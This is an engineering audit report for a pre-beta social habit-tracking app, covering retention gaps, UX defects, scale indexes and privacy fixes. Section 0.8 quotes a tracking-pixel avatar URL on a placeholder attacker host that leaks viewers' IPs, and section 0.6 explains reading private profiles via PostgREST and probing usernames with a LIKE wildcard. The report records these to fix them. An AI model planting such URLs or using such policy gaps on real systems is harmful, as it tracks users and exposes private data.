# Improvement assessment — 2026-08-16

Four parallel audits (reliability/ops, UX/accessibility, product/growth + database scale, security/privacy) were run against the committed tree at `2125709`. This document records what was found, what was fixed in this pass, and what is deliberately deferred with a reason.

The honest summary: **the engineering is good and the growth engine does not exist.** RLS, idempotency, moderation, deletion, and keyset pagination are all above average for a pre-beta codebase. But nothing brings a user back, nothing measures whether they came back, the one feature that would create a daily habit never fires, and a production incident is invisible. Those are the things that decide whether this product gets users and revenue — not another feature.

---

## Tier 0 — Blocks growth entirely

### 0.1 Nothing brings a user back — there are zero delivered notifications ✅ partially fixed

`create_social_notification()` (`supabase/migrations/20260812000000_initial_schema.sql:257`) inserts an **in-app row only**. No email, no push, no webhook, no digest cron. `notification_preferences.email_digest` is written by the API and rendered in Settings as *"Weekly momentum note — A quiet recap each Sunday"* — a promise with no sender behind it.

It was worse than that: the Notifications tab had **no unread badge**, so even the in-app notification was invisible unless the user independently decided to visit `/activity`. A user receives the entire emotional payload of the product — encouragement on something they finished — and never learns it happened.

**Fixed here:** unread count API (`src/app/api/notifications/unread-count/route.ts`) and a live badge on the Notifications tab in both the desktop rail and the mobile bar, polled on an interval and on window focus.

**Still open:** the email digest itself. That needs an email provider (Resend or Supabase SMTP), a `notification_outbox`, and a cron. It is the single highest-value remaining item and is specified in §Deferred below.

### 0.2 Recurring tasks never recurred — the habit loop could not repeat ✅ fixed

The UI sold routines ("Daily routine", "Weekdays", "Weekly chore"), the DB computed per-occurrence completion keys, and **nothing ever reset a completed task to pending**. A user created "Walk 20 minutes — Daily routine", completed it Monday, and it was gone forever. Tuesday's Today view was empty.

This is the feature that makes the app a daily habit rather than a one-off, and it fired exactly once per task.

**Fixed here:** `public.rollover_recurring_tasks()` (migration `20260817000000_growth_and_scale.sql`) resets completed recurring tasks whose occurrence key is stale, advances `due_at` to the next occurrence, and skips weekends for `weekdays` rules. Driven by `/api/cron/rollover` on an hourly schedule so it lands near local midnight across time zones, and idempotent — re-running within the same occurrence is a no-op.

### 0.3 No analytics — the activation metric is unmeasurable ⚠️ deferred, specified

`PRODUCT.md:59` defines activation as "% of new users who complete [the loop] within seven days. Track drop-off at every arrow." There is no event instrumentation of any kind: no PostHog/Mixpanel/Segment, no events table, no `track()` helper. The stop-condition in `PRODUCT.md:71` ("reposition if fewer than 20% create another task in week two") is currently un-evaluable.

Deferred rather than fixed because choosing the analytics vendor is a product decision with privacy consequences — this product's brand is anti-surveillance, and shipping a third-party pixel without deciding that deliberately would be the wrong call for me to make unilaterally. The CSP in `next.config.ts:19` would also need the vendor host added. See §Deferred for the six events to instrument.

### 0.4 Cold start is structurally guaranteed to fail ✅ fixed

Onboarding's single privacy toggle wrote **both** `profileVisibility` and `completionVisibility` from one choice, defaulted to Private, and labelled Private "Recommended". The share composer then opened pre-set to "Only me" with a primary button reading *"Post privately"*.

Net effect: a new user who did everything right — created a task, completed it, clicked "Post a win", clicked the big primary button — published **nothing to anyone**. The "People only" feed, which `PRODUCT.md:42` calls a first-class surface, would be permanently empty, and the feed's only supply would be 120 canned AI posts a day. That is the exact failure `PRODUCT.md:71` says to stop on.

**Fixed here:** the two settings are now separate questions in onboarding, matching the product contract's own words — "Making progress public and creating a social post are separate choices" (`PRODUCT.md:37`). Tasks stay private-by-default (that is the contract and it is untouched). The default *audience for a post you have already chosen to publish* now defaults to the community, because opening the composer and pressing Post is already the explicit consent. Nothing is ever auto-published.

### 0.5 Onboarding dropped users on a feed of strangers ✅ fixed

The landing CTA promised "Start with one private task". Onboarding ended with a button labelled **"Open my feed"** that routed to `/feed` — a wall of AI posts from people the user has never met, with no task of their own and no explanation of the loop. The user then had to self-navigate to a second tab to do the thing they signed up for.

**Fixed here:** onboarding now finishes on `/tasks`, and the task board shows a first-run coach card that teaches the three-beat ritual (private → complete → choose to share) until the user creates their first task.

---

### 0.6 `profile_visibility` was enforced only in React ✅ fixed — this was the most serious finding

`profile_visibility` was added in migration `20260814031000` and the profile page honours it. **`profiles_read` was never revised from `using (true)`.** Enforcement therefore lived entirely in a React component.

The anon key is published to the browser by design, so any signed-in beta user could take their own valid token and read every row of `user_profiles` straight from PostgREST — username, display name, bio, avatar, interests, daily goal, XP, streak, and `last_completion_date`, which is a per-user activity timeline — for accounts whose profile page renders "This profile is private". No tooling required for part of it: the chat contact picker selected `bio` for every user on the platform, private ones included.

For a product whose entire brand is *private means private*, this was existential. It would have been discovered by the first curious beta user.

**Fixed here** (`20260817010000_enforce_profile_visibility.sql`):
- `profiles_read` now grants full rows to the owner, to profiles that opted into being public, and to authors of a currently-visible public post — that last branch is required or a public post cannot render its own author.
- A `public_user_profiles` view provides the minimal identity projection the social join paths actually need.
- Contact search moved to a definer function that never enumerates private accounts and escapes the `_` LIKE wildcard that previously allowed pattern-guided username probing.
- `public_task_progress` no longer surfaces a private profile's username and avatar because they flipped a single task to public.
- `revoke all on all tables in schema public from anon` as a backstop, so a future `to public` policy cannot silently become an unauthenticated read.

Critically, the SQL suite previously asserted only that RLS was *enabled*, never that a policy was *correct* — which is exactly why this survived. A regression test now proves a private profile is unreadable by another authenticated user, that a public-post author stays readable, and that contact search does not enumerate private accounts. When first written, that test passed spuriously because it ran after a `reset role` (i.e. as the table owner, bypassing RLS); it fails correctly against the old policy now.

### 0.7 Account deletion never touched storage ✅ fixed

`admin.auth.admin.deleteUser` cascaded every database row correctly, but there was **no storage removal anywhere in the deletion path**. After a user exercised their right to erasure:
- their avatar survived in a **public** bucket, fetchable at a stable unauthenticated URL indefinitely;
- their abandoned completion media survived entirely — and because `social_posts` was cascade-deleted, `image_paths` (the only record of which objects existed) was destroyed, making the orphans unreclaimable by any future cleanup job.

A straight GDPR Article 17 failure, and the only finding with an explicit "we deleted your data" promise attached.

**Fixed here:** both prefixes are enumerated and purged *before* the auth user is deleted, and a removal failure aborts with a 502 rather than proceeding to delete the rows that identify the media. Covered by two new tests, including one asserting the purge happens before auth deletion.

### 0.8 Avatar URLs could beacon every viewer's IP to a third party ✅ fixed

`z.url()` performs no scheme or host restriction, so `https://attacker.example/px.gif?u=<id>` was a storable avatar — then rendered as an `<img>` in the feed, chat, replies and profile pages. Every viewer's browser fetched it, handing the URL's owner their **IP address, User-Agent and Referer**. Stored persistently, served to every viewer, inside a product that promises private profiles.

**Fixed here:** avatars are restricted to the bundled options and this project's own storage origin, and the CSP `img-src` narrowed from `https:` to that same origin so a legacy row cannot render either. `connect-src` lost its bare `wss:`, and HSTS was added.

### 0.9 Four write paths had no rate limit ✅ fixed

Publishing, replies, reactions and chat sends were limited; task creation, category creation, profile updates, chat-thread creation and upload tickets were not. The last two matter most: thread creation let one account place itself in **every** other user's chat list without ever sending a message, and upload tickets minted unbounded signed URLs for 5 MB objects with no reaper for abandoned uploads.

**Fixed here:** all five now go through the existing atomic `check_rate_limit`, failing closed if the limiter itself is unavailable. The orphaned-upload reaper remains open (§Deferred).

---

## Tier 1 — Core loop friction

### 1.1 Completing a task threw the user out of their view ✅ fixed

`task-board.tsx` reset `setCategory("All")` and `setFilter("Completed")` on every completion. Ticking one item in a filtered "Today · Work" list wiped the filter and switched tabs — the user lost their place on **every single tick**, on the most-repeated interaction in the product.

The completion was also non-optimistic: the checkbox was disabled for the full round trip, so on a slow connection ticking a task did nothing visible for seconds.

**Fixed here:** the view no longer moves (the celebration card already provides the confirmation), and completion applies immediately with rollback on failure.

### 1.2 The task edit modal was broken on a phone and swallowed its own errors ✅ fixed

No `max-height` and no scroll container: at 360×640 with the keyboard open, the form was taller than the viewport, vertically centred inside a `fixed inset-0` box, and **the Save button was unreachable**. No `role="dialog"`, no `aria-modal`, no Escape handler, no backdrop dismiss, no focus trap, no focus restore.

Worse, save and delete failures wrote to a status line rendered *underneath* the `z-50` overlay. A failed save showed the user nothing at all — the only rational response was to click Save again, repeatedly.

Task deletion also had **no confirmation whatsoever** — one click, irreversible.

**Fixed here:** full dialog semantics, scrollable body, Escape/backdrop dismiss, focus trap and restore, in-modal error alerts, and an inline delete confirmation matching the pattern already used well in `task-category-manager.tsx`.

### 1.3 Errors were styled as muted status text ✅ fixed

Every panel funnelled success *and* failure into one grey `text-muted` line with `aria-live="polite"`. A failed login rendered in the same grey as "Settings saved."

**Fixed here:** a shared `StatusMessage` component splits the two — success is `role="status"` and muted, failure is `role="alert"` on `bg-danger-soft text-danger` with an optional retry. Applied to the task board; the remaining panels are listed in §Deferred as mechanical follow-up.

### 1.4 An expired session was an unrecoverable dead end ✅ fixed

Once the session lapsed, every call threw the string "Please log in to continue.", which rendered as one line of grey body text. Nothing redirected, nothing prompted re-auth. The user sat on a fully-rendered app where every action silently failed.

**Fixed here:** `apiRequest` now redirects to `/login?next=<path>` on an unauthenticated response, once, without a redirect loop. It also gained a 20-second timeout — previously a hung request left buttons disabled forever with no cancel path.

---

## Tier 2 — Trust and production readiness

### 2.1 Raw Postgres error text was shown to end users ✅ fixed

`assertDatabase` forwarded `result.error.message` verbatim with a blanket **400**. Users would literally see `new row violates row-level security policy for table "social_posts"`. That reads as a broken prototype and leaks schema.

The status code was also wrong in a way that mattered operationally: Supabase being down, connection-pool exhaustion, and a genuine constraint violation were all `4xx`, so they were indistinguishable from client error even in Vercel's built-in charts.

**Fixed here:** Postgres error codes map to human copy (`23505` → "That already exists.", `42501`/RLS → "You don't have access to that."), connectivity and timeout classes now return **503**, and raw messages are logged server-side only.

### 2.2 A production error was invisible ✅ fixed

`console.error(error)` in `withApi` was the **only** error sink in the codebase. No Sentry, no structured logging, no `instrumentation.ts`, no log drain. A route handler that started failing after a migration would fail silently for weeks; you would find out from a user complaint.

**Fixed here:** `src/instrumentation.ts` validates required environment variables at boot (so a misconfigured deploy fails loudly instead of 500ing per-request) and registers `onRequestError`. `withApi` now emits a single structured JSON line per failure with a request id, which is returned to the client so a support ticket is traceable. `error.tsx` logs its error and digest instead of discarding them, and there is now an `(app)/error.tsx` so a crash in one page keeps the shell and navigation intact.

This is deliberately provider-agnostic — it writes structured JSON to stdout, which a Vercel Log Drain or Sentry's `captureException` can be pointed at with a one-line change. Wiring the vendor is a decision for whoever owns the account.

### 2.3 No health endpoint ✅ fixed

Nothing external could answer "is the app up and can it reach Postgres?" There was no uptime-monitor target. **Fixed:** `GET /api/health` does a cheap bounded query and reports database reachability and the deployed commit.

### 2.4 The chat route could be killed before its own fallback ran ✅ fixed

The chat route made a synchronous AI call with a 12-second provider timeout but exported no `maxDuration`, so it inherited the platform default of 10s — **shorter than the timeout it was relying on**. A slow provider meant the function was killed before the `catch` could substitute the companion's fallback reply: the user's message was already persisted, but they got a bare 504 and no reply. **Fixed:** explicit `maxDuration`, and the provider timeout lowered below it so the in-code fallback always wins.

### 2.5 No spend ceiling on AI ⚠️ partially fixed

The only guard was a 12-calls-per-minute rate limit. That is 17,280 provider calls per user per day, with no daily cap, no token accounting, and no kill switch other than unsetting the API key. Signup is open, so nothing stops N accounts.

`getAIProvider()` also read the model id straight from an unvalidated env var, so a typo or a mis-set `AI_BASE_URL` was accepted silently at runtime.

**Fixed here:** a model allowlist validated at construction, and an `AI_ENABLED` kill switch. **Deferred:** the per-user daily budget and token ledger, which need a new table and are specified in §Deferred.

---

## Tier 3 — Scale

The application will not fall over at beta size. These are the things that break between roughly 10k users and 1M posts, ordered by when they bite.

### 3.1 The feed pulled unbounded reactions and replies for every post ✅ fixed

The feed select expanded `social_reactions(...)` and `social_replies(*, ...two joined tables)` with **no limit** on either nested relation. The client only used `reactions.length` and a "did I like this" check — it needed a count and a boolean, and was transferring every like row. Meanwhile the compact feed card **doesn't render replies at all**; that entire join was waste on the hot path.

A single popular post would degrade the feed for everyone who saw it — a cliff, not a gradual slowdown.

**Fixed here:** the list feed no longer joins replies (the post detail view still does, where they are actually rendered), and reactions are fetched as the minimal fields the client consumes.

### 3.2 Missing indexes for the actual query shapes ✅ fixed

- `blocked_users` had no index on `blocked_id`. The reverse-direction clause appears in seven RLS policies and functions and was doing a sequential scan **per row, per policy, per query**.
- The notifications "All" tab — the *default* view — had no usable index, because the only one was partial on `read_at is null`. Notifications is the fastest-growing table in the schema.
- "People only" — a first-class product promise — had no index and scanned in `created_at` order discarding rows. Since AI posts accumulate at 120/day regardless of user count and human posts are near-zero, this is the **most expensive query in the app and it degrades forever**, even with zero adoption.
- Category-filtered feeds had no index.

**Fixed here:** all four added in `20260817000000_recurring_rollover_and_scale_indexes.sql`. They are plain builds, which is correct while the tables are empty pre-beta; the migration carries a note that once these tables hold production rows, further index changes must use `create index concurrently` in a standalone migration to avoid a write lock.

### 3.3 RLS policies call bare `auth.uid()` per row ⚠️ deferred, specified

Every policy uses bare `auth.uid()`, which Postgres re-evaluates **per candidate row**. Wrapping it as `(select auth.uid())` lets the planner hoist it into a cached InitPlan — Supabase's own top documented RLS optimisation, worth 10–100× on wide scans. The storage policies in `20260814031000` already use the wrapped form, so the pattern is known here, just not applied to the 30+ table policies.

Deferred because it is a large mechanical rewrite of every security policy in the system, and getting one wrong is a privacy incident rather than a performance regression. It should be done as its own change with the RLS contract suite as the gate, not folded into a broad pass. Specified in §Deferred.

### 3.4 Every API request makes a round trip to the auth server ⚠️ deferred, specified

`authenticateBearer` calls `supabase.auth.getUser(token)` — an HTTP call to GoTrue — on **every** API request. Combined with all-client-side fetching, one feed page load fires five API calls (three of them the identical `/api/profile` fetch) and therefore six auth round trips. At 10k DAU × 10 page views that is 600k GoTrue calls/day against a rate-limited endpoint, plus 200–400ms of serial latency before anything paints.

The fix is local JWT verification against the project JWKS plus hoisting the profile fetch into the server layout. Deferred because changing token verification is a security-sensitive change that deserves its own review; specified below.

---

## Deferred, with specifications

Ordered by business impact. Each is deferred for a stated reason, not forgotten.

1. **Email digest / delivered notifications.** `notification_outbox` table; trigger on `notifications` insert; `/api/cron/digest` batching per user honouring the existing `email_digest` / `replies` / `reactions` preference columns; Resend or Supabase SMTP. *Blocked on: choosing an email provider and completing the SMTP deliverability testing that `PRODUCT.md`'s launch gate already requires.* This is the highest-value remaining item.

2. **Analytics.** A `track(event, props)` helper client- and server-side, six events matching the `PRODUCT.md` funnel arrows exactly: `signup_completed`, `onboarding_completed`, `task_created`, `task_completed`, `share_decision {shared|kept_private}`, `encouragement_received`. *Blocked on: vendor choice, which is a privacy-brand decision. Add the vendor host to the CSP in `next.config.ts:19` when wiring.*

3. **RLS `(select auth.uid())` migration.** Mechanical wrap of every policy predicate. *Deferred to its own change gated on the RLS contract suite, because a mistake here is a privacy incident.*

4. **Per-user AI budget + token ledger.** `ai_usage(user_id, model, prompt_tokens, completion_tokens, created_at)`; a `chat:ai:daily` bucket in the existing `check_rate_limit`; record token counts from the provider response. *Deferred: needs a migration and a decision on the daily allowance, which is really a pricing decision.*

5. **Local JWT verification + profile fetch dedup.** Verify with `jose` against the project JWKS; hoist `/api/profile` into `(app)/layout.tsx` and pass down via context. *Deferred: security-sensitive, deserves isolated review.*

6. **Acquisition surface.** There is currently **no invite flow, no share link, no public profile, and no SEO** — `/u/[username]` sits under `(app)` and redirects anonymous visitors to a login wall, and `/posts/[postId]` has the static title "Post" with no crawlable content. The viral loop for this product should be *"my friend sent me the thing they finished"*, and none of that plumbing exists. Needs: anonymous-readable public profiles with an `anon` SELECT policy scoped to `profile_visibility='public'`, `generateMetadata` + OG images, copy-link on posts, and invite codes with cohort tags (which `PRODUCT.md:65`'s beta plan directly requires). *Deferred: this is a feature workstream, not a fix, and the anon RLS policy must be designed carefully against the privacy contract.*

7. **Billing.** Nothing exists but a safety interlock: any Stripe env var being set makes account deletion return 409 for every user. That interlock is correct and should stay until a cancellation adapter exists. Minimum path: `subscriptions` table → Stripe Checkout + webhook → **cancellation adapter wired into account deletion first** → entitlement helper → pricing page. Suggested tier, respecting the contract that safety/privacy/deletion/basic encouragement stay free: full history, routines, companion selection and personalisation, chat beyond a daily quota, import/export. *Deferred deliberately — `PRODUCT.md:94` says do not launch billing until retention is proven, and retention is currently neither delivered (§0.1) nor measured (§0.3). Building billing next would be the wrong order.*

8. **Companion content is a 6-item daily loop.** Each companion's catalog holds exactly 6 entries and the scheduler posts all 6 every day, so day 2 is day 1 reshuffled. A week-2 retention killer given human posts are near-zero. Fix: expand catalogs and select a rolling non-repeating window keyed on the date; longer term, generate rather than replay.

9. **Remaining UX polish**, mechanical and low-risk: apply the shared `StatusMessage` to the other seven panels; a shared `<Modal>` with focus trap for the remaining three dialogs; optimistic chat send; `break-words` on feed/task/notification text; contrast fixes for `text-white/70` on brand and `--ink-subtle` placeholders; touch-target padding on the sub-44px controls; axe assertions in the *open* state for all four modals (the current suite only tests closed states, which is why the dialog defects in §1.2 were missed); keyset pagination for tasks, replies, chat threads, and profile tabs.

10. **Deploy pipeline.** Migrations are applied by hand; CI never runs `supabase db push`. A deploy shipping code ahead of its migration would fail every affected request with no alert. Needs a `deploy.yml` gated on the existing `database` job, plus a documented and tested restore drill.

11. **Orphaned upload reaper.** Upload tickets are now rate limited, but nothing sweeps `pending/` objects that were uploaded and never published. Needs a scheduled job — the `assertPrivilegedRequest` cron pattern already exists — deleting `pending/` objects older than 24h that no `social_posts.image_paths` references. Same shape for pruning `api_rate_limits` rows, which currently grow forever and outlive deleted accounts.

12. **Remaining security hardening**, all verified but lower severity: `assertPrivilegedRequest` uses a non-constant-time string compare and accepts either secret on both routes, so the two-secret split provides no real separation; `script-src` still carries `'unsafe-inline'` (there are currently **zero** XSS sinks — no `dangerouslySetInnerHTML` anywhere — so this is defence-in-depth that is switched off, not a live hole); `touch_updated_at` is the one function without `set search_path`; there is no data-export endpoint for GDPR Article 20; and private chat content is sent to whatever `AI_BASE_URL` points at, which the privacy notice should name as a subprocessor.

**What the security audit confirmed as already solid**, so it does not get re-litigated: actor identity is never taken from a request body in any of the 29 route handlers, and no IDOR exists in any `[id]` route; RLS is enabled on all 20 tables; all 22 `SECURITY DEFINER` functions set `search_path`; all ids are UUIDv4 and the pagination cursor validates its own shape; storage paths are traversal-proof with a fully anchored regex; completion media lives in a private bucket with zero object policies, so a user genuinely cannot read another user's completion images; uploads are magic-byte validated; and companion/AI rows are properly fenced from browser roles.

---

## Verification

Every change in this pass is covered by the existing gates plus new tests: lint, strict typecheck, the Vitest suite, a production build, and a clean `supabase db reset` with the SQL contract tests.
